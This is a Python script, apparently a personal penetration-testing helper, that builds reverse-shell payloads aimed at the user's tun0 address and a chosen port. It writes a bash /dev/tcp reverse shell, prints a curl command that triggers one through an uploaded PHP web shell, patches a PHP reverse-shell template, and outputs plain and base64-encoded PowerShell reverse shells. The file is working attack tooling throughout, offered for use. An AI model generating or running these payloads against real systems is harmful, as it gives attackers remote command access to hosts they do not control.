#!/usr/bin/python3

import argparse
import subprocess
import os
import re
import base64

PL_PATH = '/opt/Scripts/makepl/payloads/' 

def get_tun0_ip():
    return subprocess.check_output("ip a | grep -A 2 'tun0:' | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'", shell=True).decode().strip()

parser = argparse.ArgumentParser(description='Payload maker')
parser.add_argument("--lhost", type=str, default=get_tun0_ip(), help='local host (default: tun0)')
parser.add_argument("--lport", type=int, default=1234, help='local port (default: 1234)')

# payload_group = parser.add_mutually_exclusive_group(required=True)
# payload_group.add_argument('-f', '--file', type=str, help='Filepath for the LFI')
# payload_group.add_argument('-md', '--markdown', type=str, help='Use markdown file not given XSS payload')
args = parser.parse_args()


class php_pl:
    def show_php_pl(self):
        print("\n=== PHP Payload ===")
        print("1. WEB CMD  [cmd.php]")
        print("2. RevShell [revshell.php]")

    def php_cmd(self):
        os.system(f'cp {PL_PATH}cmd.php .')
        print(f"curl -s -G http://?/cmd.php --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'\"")

    def php_revshell(self):
        with open(f'{PL_PATH}revshell.php', 'r') as file:
            content = file.read()
        content = re.sub(r"\$ip\s*=\s*'[^']*';", f"$ip = '{args.lhost}';", content)
        content = re.sub(r"\$port\s*=\s*\d*;", f"$port = {args.lport};", content)
        with open(f'{PL_PATH}revshell.php', 'w') as file:
            file.write(content)
        os.system(f'cp {PL_PATH}revshell.php .')

def make_bash():
    content = f"""#!/bin/bash
bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'"""
    with open(f'{PL_PATH}revshell.sh', 'w') as file:
        file.write(content)
    os.system(f'cp {PL_PATH}revshell.sh .')

class ps_pl:
    def show_ps_pl(self):
        print("\n=== Powershell Payload ===")
        print("1. Plain  [revshell.ps1]")
        print("2. Base64 [revshell.ps1]")
        
    def ps_plain(self):
        with open(f'{PL_PATH}revshell.ps1', "r") as file:
            powershell_script = file.read()
        powershell_script = re.sub(r'"(\d+\.\d+\.\d+\.\d+)"', f'"{args.lhost}"', powershell_script)
        powershell_script = re.sub(r'(\d+)(?=\))', f'{args.lport}', powershell_script)
        with open(f'{PL_PATH}revshell.ps1', "w") as file:
            file.write(powershell_script)
        os.system(f'cp {PL_PATH}revshell.ps1 .')

    def ps_b64(self):
        with open(f'{PL_PATH}revshell.ps1', "r", encoding="utf-8") as f:
            script = f.read()
        utf16_bytes = script.encode('utf-16le')
        base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
        with open(f'{PL_PATH}b64_revshell.ps1', "w") as file:
            file.write(f'powershell -e {base64_encoded}')
        os.system(f'cp {PL_PATH}b64_revshell.ps1 .')

def main():
    while True:
        print("\n1. PHP\n2. Bash [revshell.sh]\n3. Powershell")
        choice = input(": ")

        if choice == "1":
            php_pl_ = php_pl()
            while True:
                php_pl_.show_php_pl()
                choice = input(": ")
                if choice == "1":
                    php_pl_.php_cmd()
                    exit()
                elif choice == "2":
                    php_pl_.php_revshell()
                    exit()
                else:
                    exit()
        elif choice == "2":
            make_bash()
            exit()
        elif choice == "3":
            ps_pl_ = ps_pl()
            while True:
                ps_pl_.show_ps_pl()
                choice = input(": ")
                if choice == "1":
                    ps_pl_.ps_plain()
                    exit()
                elif choice == "2":
                    ps_pl_.ps_b64()
                    exit()
                else:
                    exit()
        else:
            exit()

if __name__ == "__main__":
    main()